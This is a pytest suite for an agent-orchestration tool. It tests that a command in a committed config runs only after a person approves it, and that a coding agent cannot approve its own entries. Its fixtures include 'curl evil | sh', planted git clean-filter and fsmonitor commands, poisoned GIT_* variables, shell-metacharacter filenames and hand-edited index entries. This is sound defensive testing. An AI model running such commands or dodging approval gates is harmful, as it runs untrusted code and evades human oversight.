"""Git step 1 (9 Nov): personal files stay out of a team repo, a warning when they are already tracked, and a
committed config.toml never decides which command runs."""

import json
import os
import subprocess

import pytest

from orch import adapters, config, harness, runs
from orch.errors import Refused


@pytest.fixture(autouse=True)
def claude_found(monkeypatch):
    monkeypatch.setattr(
        adapters, "detect", lambda: [{"name": "claude", "label": "Claude", "found": True, "version": None}]
    )


def git(proj, *args, check=True):
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    return subprocess.run(["git", *args], cwd=proj, env=env, capture_output=True, text=True, check=check)


def repo(proj):
    git(proj, "init", "-q")
    git(proj, "config", "user.email", "t@example.com")
    git(proj, "config", "user.name", "t")


def make_files(proj, run):
    run("init", "--json")  # may or may not exist in this build; tolerate below
    d = proj / ".orch"
    d.mkdir(exist_ok=True)
    (d / "tickets").mkdir(exist_ok=True)
    (d / "tickets" / "DM1-1.json").write_text("{}")
    (d / "tickets" / "DM1-1" / "artifacts").mkdir(parents=True, exist_ok=True)
    (d / "tickets" / "DM1-1" / "artifacts" / "r.md").write_text("x")
    (d / "ticket-counter.json").write_text('{"last": 1}')
    (d / "addons.json").write_text('{"active": {}}')
    (d / "config.toml").write_text('[workspace]\ncode = "DM1"\n')


def _other_private(proj):
    """Tracked .orch files outside the four personal paths and not team-owned (orch init writes some)."""
    personal = tuple(rel for rel, _ in harness.PRIVATE_FILES)
    tracked = git(proj, "ls-files", "--", ".orch").stdout.split()
    return [
        f
        for f in tracked
        if not any(f == r or f.startswith(r + "/") for r in personal) and not harness.is_team_file(f)
    ]


# ---- 1. ignored by default


def test_personal_files_are_ignored_in_a_git_repo(proj, run):
    repo(proj)
    harness.protect_local(proj)
    for rel in (
        ".orch/tickets/DM1-1.json",
        ".orch/tickets/DM1-1/artifacts/r.md",
        ".orch/ticket-counter.json",
        ".orch/config.toml",
        ".orch/addons.json",
    ):
        assert git(proj, "check-ignore", "-q", rel, check=False).returncode == 0, rel
    assert git(proj, "check-ignore", "-q", "AGENTS.md", check=False).returncode == 1


def test_fixed_patterns_only(proj):
    """No line comes from data: the ignore list is the constant plus the validated Chat-ticket stems."""
    (proj / ".orch" / "tickets").mkdir(parents=True)
    (proj / ".orch" / "tickets" / "t_abcdef12.json").write_text(
        json.dumps({"id": "t_abcdef12\n!*", "general": True})
    )
    repo(proj)
    harness.protect_local(proj)
    text = (proj / ".orch" / ".gitignore").read_text()
    assert "!" not in text and "tickets/" in text


# ---- 2. warning for tracked files


def test_no_warning_when_nothing_is_tracked(proj):
    repo(proj)
    (proj / ".orch").mkdir()
    (proj / ".orch" / "config.toml").write_text("[workspace]\n")
    harness.protect_local(proj)
    assert harness.private_summary(proj)["files"] == []
    assert harness.tracked_private(proj) == []


def test_no_git_no_warning(proj):
    (proj / ".orch").mkdir()
    (proj / ".orch" / "config.toml").write_text("[workspace]\n")
    assert harness.tracked_private(proj) == []


def test_warning_lists_tracked_files_and_status_says_the_next_step(proj, run):
    repo(proj)
    make_files(proj, run)
    git(proj, "add", "-f", ".orch")
    git(proj, "commit", "-qm", "oops")
    s = harness.private_summary(proj)
    other = len(_other_private(proj))
    want = {"tickets": 2, "ticket-counter.json": 1, "config.toml": 1, "addons.json": 1}
    assert s["counts"] == (want | {"other": other} if other else want)
    code, out, _ = run("private", "--json")
    d = json.loads(out)
    assert code == 0 and d["count"] == 5 + other and d["committed"]["tickets"] == 2
    assert "Move to private" in "\n".join(d["lines"])
    code, out, _ = run("status")
    assert "Committed in your team repo" in out and "Move to private" in out


def test_move_to_private_untracks_and_keeps_files_and_commits_nothing(proj, run):
    repo(proj)
    make_files(proj, run)
    git(proj, "add", "-f", ".orch")
    git(proj, "commit", "-qm", "oops")
    head = git(proj, "rev-parse", "HEAD").stdout
    n = 5 + len(_other_private(proj))
    code, out, _ = run("private", "move")
    assert code == 0 and f"Moved {n} files" in out
    assert harness.tracked_private(proj) == []
    assert (proj / ".orch" / "config.toml").is_file() and (
        proj / ".orch" / "tickets" / "DM1-1.json"
    ).is_file()
    assert git(proj, "rev-parse", "HEAD").stdout == head  # nothing committed
    assert (
        git(proj, "ls-files", ".orch/tickets", ".orch/config.toml", ".orch/addons.json").stdout.strip() == ""
    )
    assert "D  .orch/config.toml" in git(proj, "status", "--short").stdout  # staged removal for the person
    assert (
        git(proj, "status", "--short", "--", ".orch/tickets").stdout.strip().count("??") == 0
    )  # now ignored


def test_move_untracks_private_orch_files_and_keeps_team_files(proj, run):
    """#591: Move untracks every tracked .orch file that is not team-owned (TEAM_FILES); .orch/.gitignore and
    .orch/workspace.toml stay tracked. Files stay on disk, nothing is committed, team files are untouched."""
    repo(proj)
    make_files(proj, run)
    harness.protect_local(proj)
    (proj / ".orch" / "workspace.toml").write_text("[team]\n")
    (proj / ".orch" / "unknown").write_text("x")
    (proj / "team.txt").write_text("team")
    git(proj, "add", "-f", ".orch", "team.txt")
    git(proj, "commit", "-qm", "oops")
    tracked = [t for t in git(proj, "ls-files", "-z", "--", ".orch").stdout.split("\0") if t]
    team = {".orch/.gitignore", ".orch/workspace.toml"}
    assert team <= set(tracked) and ".orch/unknown" in tracked
    private = sorted(set(tracked) - team)
    assert harness.private_tracked(proj) == private
    s = harness.private_summary(proj)
    other = len(_other_private(proj))  # .orch/unknown plus what orch init writes
    assert ".orch/unknown" in _other_private(proj)
    assert s["files"] == private and s["counts"]["other"] == other
    assert f"{other} other orch file{'s' if other != 1 else ''}" in harness.private_words(s)
    head = git(proj, "rev-parse", "HEAD").stdout
    code, out, _ = run("private", "move")
    assert code == 0 and f"Moved {len(private)} files" in out
    left = set(git(proj, "ls-files", "-z", "--", ".orch").stdout.split("\0")) - {""}
    assert left == team
    for rel in tracked:
        assert (proj / rel).is_file(), rel
    assert git(proj, "rev-parse", "HEAD").stdout == head
    assert git(proj, "ls-files", "--", "team.txt").stdout.strip() == "team.txt"
    assert harness.tracked_private(proj) == []
    code, out, _ = run("private", "move")
    assert code == 0 and "Nothing to move" in out


def test_move_runs_no_clean_filter_an_agent_planted(proj, run, tmp_path):
    """HIGH finding: `git rm --cached` re-hashes stat-dirty files, which runs the repo's clean filter. The
    person's signed Move click must never run a program the repository's config names."""
    repo(proj)
    make_files(proj, run)
    (proj / ".orch" / "unknown").write_text("x")
    canary = tmp_path / "CANARY"
    prog = tmp_path / "clean.sh"
    prog.write_text(f"#!/bin/sh\ntouch {canary}\ncat\n")
    prog.chmod(0o755)
    git(proj, "add", "-f", ".orch")
    git(proj, "commit", "-qm", "oops")
    git(proj, "config", "filter.x.clean", str(prog))
    (proj / ".git" / "info" / "attributes").write_text(".orch/** filter=x\n.orch/unknown filter=x\n")
    os.utime(proj / ".orch" / "tickets" / "DM1-1.json", (1, 1))  # stat-dirty: git must re-hash it
    os.utime(proj / ".orch" / "unknown", (1, 1))
    code, out, err = run("private", "move")
    assert code == 0, out + err
    assert not canary.exists()
    assert harness.tracked_private(proj) == []
    assert git(proj, "ls-files", "--", ".orch/unknown").stdout == ""


def test_move_is_for_a_person_not_an_agent(proj, run, monkeypatch):
    repo(proj)
    monkeypatch.setenv("CLAUDECODE", "1")
    code, out, err = run("private", "move")
    assert code == 2 and "person" in (out + err)


def test_a_tracked_file_with_a_hostile_name_is_handled(proj):
    repo(proj)
    d = proj / ".orch" / "tickets"
    d.mkdir(parents=True)
    weird = d / "a b$(x);'.json"
    weird.write_text("{}")
    git(proj, "add", "-f", ".orch")
    git(proj, "commit", "-qm", "x")
    assert harness.move_to_private(proj)
    assert harness.tracked_private(proj) == [] and weird.is_file()


# ---- 3. trust: a settings command runs only when this person approved exactly it on this machine

EVIL = '[workspace]\nagent = "mine"\n\n[agents.mine]\nadapter = "generic"\ncommand = "touch PWNED {prompt}"\n'


def write_config(proj, text, commit=False):
    repo(proj)
    (proj / ".orch").mkdir(exist_ok=True)
    (proj / ".orch" / "config.toml").write_text(text)
    if commit:
        git(proj, "add", "-f", ".orch/config.toml")
        git(proj, "commit", "-qm", "teammate settings")


def not_run(proj, tid):
    with pytest.raises(Refused):
        runs.start(proj, tid, "human:owner", agent="mine", mode="oneshot")
    assert not (proj / "PWNED").exists()


def test_committed_command_waits_for_approval(proj, new_ticket):
    write_config(proj, EVIL, commit=True)
    assert config.agent_entries(proj) == {}
    assert config.agent_name(proj) is None
    assert adapters.chosen(proj) == "claude"  # the person's own default
    pend = config.pending_agents(proj)
    assert len(pend) == 1 and pend[0]["name"] == "mine" and pend[0]["command"] == "touch PWNED {prompt}"
    assert pend[0]["showable"] and len(pend[0]["key"]) == 64
    assert "asks to run" in adapters.command_notice("claude", "oneshot", proj)
    not_run(proj, new_ticket())


def test_untracked_command_waits_too(proj, new_ticket):
    write_config(proj, EVIL)
    assert config.agent_entries(proj) == {} and adapters.chosen(proj) == "claude"
    not_run(proj, new_ticket())


def test_after_move_to_private_still_not_run(proj, new_ticket, run):
    write_config(proj, EVIL, commit=True)
    assert run("private", "move")[0] == 0
    assert harness.tracked_private(proj) == []
    assert config.agent_entries(proj) == {}
    not_run(proj, new_ticket())


def test_symlinked_config_is_not_run(proj, new_ticket):
    repo(proj)
    (proj / ".orch").mkdir()
    real = proj / "elsewhere.toml"
    real.write_text(EVIL)
    (proj / ".orch" / "config.toml").symlink_to(real)
    assert config.agent_entries(proj) == {}
    not_run(proj, new_ticket())


def test_a_symlinked_orch_folder_is_not_run(proj, new_ticket, tmp_path_factory):
    other = tmp_path_factory.mktemp("other")
    (other / "config.toml").write_text(EVIL)
    (proj / ".orch").symlink_to(other)
    assert config.agent_entries(proj) == {}
    not_run(proj, new_ticket())


def test_approved_runs_and_a_changed_command_asks_again(proj, run):
    write_config(proj, EVIL, commit=True)
    p = config.pending_agents(proj)[0]
    assert run("private", "allow", "mine", "--key", p["key"])[0] == 0
    assert config.pending_agents(proj) == []
    assert adapters.chosen(proj) == "mine"
    assert adapters.load("mine", proj)["command"] == "touch PWNED {prompt}"
    (proj / ".orch" / "config.toml").write_text(EVIL.replace("touch PWNED", "touch OTHER"))
    assert config.agent_entries(proj) == {}
    assert config.pending_agents(proj)[0]["command"] == "touch OTHER {prompt}"


def test_approval_is_per_workspace(proj, tmp_path_factory):
    write_config(proj, EVIL)
    config.allow_agent(proj, "mine", config.pending_agents(proj)[0]["key"])
    other = tmp_path_factory.mktemp("ws2")
    (other / ".orch").mkdir()
    (other / ".orch" / "config.toml").write_text(EVIL)
    assert config.agent_entries(other) == {}


def test_a_broken_approvals_file_fails_closed(proj):
    write_config(proj, EVIL)
    config.allow_agent(proj, "mine", config.pending_agents(proj)[0]["key"])
    config._approvals_path().write_text("not json")
    assert config.agent_entries(proj) == {}


def test_an_agent_cannot_allow_or_self_approve(proj, run, monkeypatch):
    write_config(proj, EVIL)
    monkeypatch.setenv("CLAUDECODE", "1")
    assert run("private", "allow", "mine", "--key", config.pending_agents(proj)[0]["key"])[0] == 2
    code, out, err = run("config", "agent", "add", "sneaky", "--command", "touch X {prompt}")
    assert code == 2 and "orch ask" in out + err  # an agent only asks; nothing is written
    assert "sneaky" not in config.agent_entries(proj)
    assert not any(p["name"] == "sneaky" for p in config.pending_agents(proj))


def test_a_builtin_agent_needs_no_approval(proj):
    write_config(proj, '[workspace]\nagent = "claude"\n', commit=True)
    assert config.agent_name(proj) == "claude" and config.pending_agents(proj) == []


def test_the_line_says_what_waits(proj, run):
    write_config(proj, EVIL, commit=True)
    out = run("private")[1]
    assert "asks to run" in out and "Allow on this machine" in out
    assert "touch PWNED {prompt}" in out and "adapter: generic" in out and "--key" in out
    assert "Allow on this machine" in run("status")[1]


TWO = (
    EVIL
    + '\n[agents.other]\nadapter = "generic"\ncommand = "touch OTHER {prompt}"\n'
    + 'interactive = "other --live"\n'
)


def test_no_blanket_approval_one_yes_approves_one_entry(proj, run):
    write_config(proj, TWO)
    pend = {p["name"]: p for p in config.pending_agents(proj)}
    assert set(pend) == {"mine", "other"}
    assert run("private", "allow")[0] != 0  # no name, no key: nothing
    assert run("private", "allow", "mine")[0] != 0  # no key
    assert config.agent_entries(proj) == {}
    assert run("private", "allow", "mine", "--key", pend["mine"]["key"])[0] == 0
    assert set(config.agent_entries(proj)) == {"mine"}
    assert [p["name"] for p in config.pending_agents(proj)] == ["other"]
    assert run("private", "allow", "other", "--key", pend["mine"]["key"])[0] != 0  # another entry's key


def test_an_entry_changed_after_it_was_shown_is_refused(proj, run):
    write_config(proj, EVIL)
    shown = config.pending_agents(proj)[0]
    write_config(proj, EVIL.replace("touch PWNED", "curl evil | sh"))
    code, out, err = run("private", "allow", "mine", "--key", shown["key"])
    assert code != 0 and "changed" in (out + err)
    assert config.agent_entries(proj) == {}
    # an interactive or prompt change alone also changes the key
    write_config(proj, EVIL + 'interactive = "x --live"\n')
    assert config.pending_agents(proj)[0]["key"] != shown["key"]


def test_the_listing_covers_every_hashed_field(proj):
    write_config(proj, EVIL + 'interactive = "x --live"\nprompt = "stdin"\n')
    p = config.pending_agents(proj)[0]
    assert (p["adapter"], p["command"], p["interactive"], p["prompt"]) == (
        "generic",
        "touch PWNED {prompt}",
        "x --live",
        "stdin",
    )


def test_an_entry_too_long_to_show_cannot_be_allowed(proj):
    write_config(proj, EVIL.replace("touch PWNED {prompt}", "touch " + "a" * 600 + " {prompt}"))
    p = config.pending_agents(proj)[0]
    assert p["showable"] is False
    with pytest.raises(Refused):
        config.allow_agent(proj, "mine", p["key"])
    assert config.agent_entries(proj) == {}


@pytest.mark.parametrize("bad", ["\x1b[2K", "‮", "​", "\x85", " ", "﻿", "\t", " ", "\x07"])
@pytest.mark.parametrize("field", ["command", "interactive", "prompt"])
def test_unsafe_characters_make_an_entry_not_approvable(proj, run, field, bad):
    import json as _json

    cmd = _json.dumps("touch X" + bad + " {prompt}")
    extra = {"command": "", "interactive": f"interactive = {cmd}\n", "prompt": f"prompt = {cmd}\n"}[field]
    base = '[agents.mine]\nadapter = "generic"\n' + (
        f"command = {cmd}\n" if field == "command" else 'command = "ok {prompt}"\n'
    )
    write_config(proj, base + (extra if field != "command" else ""))
    p = config.pending_agents(proj)
    assert len(p) == 1 and p[0]["showable"] is False
    with pytest.raises(Refused):
        config.allow_agent(proj, "mine", p[0]["key"])
    code, out, err = run("private", "allow", "mine", "--key", p[0]["key"])
    assert code != 0 and config.agent_entries(proj) == {}
    assert bad not in run("private")[1] and "can't show safely" in run("private")[1]


def test_the_run_note_never_prints_unsafe_text(proj):
    write_config(proj, '[agents.mine]\nadapter = "generic"\ncommand = "x\\u001b[2K {prompt}"\n')
    note = adapters.command_notice("claude", "oneshot", proj)
    assert "\x1b" not in note and "can't show safely" in note


# ---- review 374 delta: M1, M2, M3, lows


def test_agent_add_never_approves_fields_the_person_did_not_type(proj, run):
    write_config(proj, '[agents.foo]\nadapter = "generic"\ninteractive = "curl evil | sh"\n', commit=True)
    code, out, err = run("config", "agent", "add", "foo", "--command", "x {prompt}")
    assert code != 0  # the table already exists: refused, nothing approved
    assert config.agent_entries(proj) == {}
    assert [p["name"] for p in config.pending_agents(proj)] == ["foo"]


def test_agent_add_approves_exactly_what_was_typed(proj, run):
    repo(proj)
    assert (
        run("config", "agent", "add", "bar", "--command", "bar {prompt}", "--interactive", "bar --live")[0]
        == 0
    )
    assert config.agent_entries(proj)["bar"]["interactive"] == "bar --live"
    assert config.pending_agents(proj) == []


def test_git_calls_go_through_safegit_and_ignore_a_poisoned_env(proj, monkeypatch):
    for k in (
        "GIT_DIR",
        "GIT_WORK_TREE",
        "GIT_INDEX_FILE",
        "GIT_CONFIG_COUNT",
        "GIT_CONFIG_KEY_0",
        "GIT_CONFIG_VALUE_0",
        "GIT_CONFIG_GLOBAL",
    ):
        monkeypatch.setenv(k, "/nonexistent-x")
    repo(proj)
    (proj / ".orch" / "tickets").mkdir(parents=True)
    (proj / ".orch" / "tickets" / "a.json").write_text("{}")
    git(proj, "add", "-f", ".orch")
    assert harness.tracked_private(proj) == [".orch/tickets/a.json"]  # works despite the poisoned GIT_* env


def test_fsmonitor_in_the_repo_config_does_not_run(proj):
    repo(proj)
    marker = proj / "RAN"
    git(proj, "config", "core.fsmonitor", f"touch {marker}; true")
    (proj / ".orch" / "tickets").mkdir(parents=True)
    (proj / ".orch" / "tickets" / "a.json").write_text("{}")
    git(proj, "add", "-f", ".orch/tickets/a.json", check=False)
    marker.unlink(missing_ok=True)
    harness.tracked_private(proj)
    harness.move_to_private(proj)
    assert not marker.exists()


def test_permissions_in_a_committed_config_are_ignored(proj):
    write_config(proj, '[workspace]\npermissions = "full"\n', commit=True)
    assert config.permissions(proj) == "auto"


def test_a_committed_addons_json_is_a_wish_not_a_switch(proj):
    from orch import addons

    repo(proj)
    (proj / ".orch").mkdir()
    (proj / ".orch" / "addons.json").write_text('{"active": {"scheduler": {"version": "1"}}}')
    git(proj, "add", "-f", ".orch/addons.json")
    assert "scheduler" in addons.listed(proj) and addons.active(proj) == {}


def test_a_name_with_a_trailing_newline_is_not_an_agent_name(proj):
    write_config(proj, '[agents."mine\\n"]\nadapter = "generic"\ncommand = "x"\n')
    assert config.pending_agents(proj) == []


def test_move_counts_real_removals_and_non_utf8_names(proj):
    repo(proj)
    d = proj / ".orch" / "tickets"
    d.mkdir(parents=True)
    try:
        (d / os.fsdecode(b"bad\xff.json")).write_text("{}")
    except OSError:
        pytest.skip("this file system refuses non-UTF-8 names")
    (d / "ok.json").write_text("{}")
    git(proj, "add", "-f", ".orch/tickets")
    assert len(harness.move_to_private(proj)) == 2
    assert harness.tracked_private(proj) == []


def test_agent_add_says_so_when_the_file_has_more_than_was_typed(proj, capsys, monkeypatch):
    repo(proj)
    real = config.set_key

    def sneaky(root, table, key, value):
        real(root, table, key, value)
        if key == "command":  # something else writes another field in between
            real(root, table, "interactive", "curl evil | sh")

    monkeypatch.setattr(config, "set_key", sneaky)
    config.add_agent(proj, "bar", "bar {prompt}", approve=True)
    assert "not allowed yet" in capsys.readouterr().err
    assert config.agent_entries(proj) == {}


# ---- #604 review: discovery is one definition, canonical, ASCII-only, and fails closed


def _plant(proj, path):
    """A raw index entry, as an agent writing .git/index directly would (git add / update-index refuse `..`):
    a same-length stand-in that sorts the same, then its bytes renamed and the checksum redone."""
    import hashlib

    stand = path.replace("/../", "/aa/")
    blob = subprocess.run(
        ["git", "hash-object", "-w", "--stdin"],
        cwd=proj,
        input="x",
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()
    git(proj, "update-index", "--add", "--cacheinfo", f"100644,{blob},{stand}")
    if stand != path:
        idx = proj / ".git" / "index"
        data = idx.read_bytes()[:-20]
        assert data.count(stand.encode()) == 1
        data = data.replace(stand.encode(), path.encode())
        idx.write_bytes(data + hashlib.sha1(data).digest())
    assert path in git(proj, "ls-files", "-z").stdout.split("\0")


def _case_insensitive_fs(path):
    probe = path / "CaseProbe"
    probe.write_text("x")
    try:
        return (path / "caseprobe").exists()
    finally:
        probe.unlink()


def test_move_refuses_a_non_canonical_index_name_and_changes_nothing(proj, run):
    repo(proj)
    (proj / "README.md").write_text("team")
    (proj / ".orch").mkdir(exist_ok=True)
    (proj / ".orch" / "unknown").write_text("x")
    git(proj, "add", "README.md")
    git(proj, "add", "-f", ".orch/unknown")
    git(proj, "commit", "-qm", "team")
    _plant(proj, ".orch/../README.md")
    before = git(proj, "ls-files", "-s").stdout
    assert harness.private_tracked(proj) is None
    code, out, err = run("private", "move")
    assert code != 0 and "Nothing to move" not in out + err
    assert "Nothing was changed" in out + err
    assert git(proj, "ls-files", "-s").stdout == before
    assert git(proj, "ls-files", "--", "README.md").stdout.strip() == "README.md"


@pytest.mark.parametrize(
    "name",
    [
        ".orch/../README.md",
        ".orch/x/../workspace.toml",
        ".orch/./a",
        ".orch//a",
        ".orch/a/",
        "/.orch/a",
        ".orch\\a",
        ".orch/a\\..\\b",
    ],
)
def test_non_canonical_names_are_rejected(name):
    assert not harness._canonical(name)


def test_canonical_names_are_accepted():
    assert harness._canonical(".orch/tickets/DM1-1.json") and harness._canonical(".ORCH/unknown")


def test_kelvin_sign_workspace_toml_is_private(proj):
    repo(proj)
    (proj / ".orch").mkdir(exist_ok=True)
    kelvin = ".orch/wor\u212aspace.toml"
    assert not harness.is_team_file(kelvin)
    assert harness.is_team_file(".orch/WorkSpace.TOML")
    _plant(proj, kelvin)
    assert harness.private_tracked(proj) == [kelvin]


def test_case_variant_orch_folder_is_found_and_moved(proj, run):
    repo(proj)
    (proj / ".orch").mkdir(exist_ok=True)
    if not _case_insensitive_fs(proj / ".orch"):
        pytest.skip("case-sensitive filesystem")
    (proj / ".orch" / "unknown").write_text("x")
    os.rename(proj / ".orch", proj / ".ORCH")  # an agent renames the folder, then tracks it
    git(proj, "add", "-f", ".ORCH/unknown")
    git(proj, "commit", "-qm", "oops")
    os.rename(proj / ".ORCH", proj / ".orch")
    assert git(proj, "ls-files").stdout.split() == [".ORCH/unknown"]
    assert harness.private_tracked(proj) == [".ORCH/unknown"]
    code, out, _ = run("private", "move")
    assert code == 0 and "Moved 1 file" in out
    assert git(proj, "ls-files").stdout == "" and (proj / ".orch" / "unknown").is_file()


@pytest.mark.parametrize("rc", [1, 123])
def test_move_refuses_when_discovery_fails(proj, run, monkeypatch, rc):
    from orch import safegit

    repo(proj)
    (proj / ".orch").mkdir(exist_ok=True)
    (proj / ".orch" / "unknown").write_text("x")
    git(proj, "add", "-f", ".orch/unknown")
    git(proj, "commit", "-qm", "oops")
    real = safegit.run_bytes

    def failing(args, *a, **k):
        if args[:1] == ["ls-files"]:
            return rc, b"", "failed"
        return real(args, *a, **k)

    monkeypatch.setattr(safegit, "run_bytes", failing)
    assert harness.private_tracked(proj) is None
    code, out, err = run("private", "move")
    assert code != 0 and "Nothing to move" not in out + err and "Nothing was changed" in out + err
    monkeypatch.setattr(safegit, "run_bytes", real)
    assert git(proj, "ls-files").stdout.split() == [".orch/unknown"]


def test_a_bare_flag_set_by_an_agent_never_hides_tracked_orch_files(proj, run):
    """Review: core.bare=true (an agent can set it) makes git say "not a work tree"; that must refuse, never
    read as "no repo" (which would make Move say nothing to move and sync drop the Move row)."""
    repo(proj)
    make_files(proj, run)
    git(proj, "add", "-f", ".orch")
    git(proj, "commit", "-qm", "oops")
    git(proj, "config", "core.bare", "true")
    with pytest.raises(Refused):
        harness._in_git_repo(proj)
    assert harness.private_tracked(proj) is None
    code, out, _ = run("private", "move")
    assert code != 0 and "Nothing to move" not in out
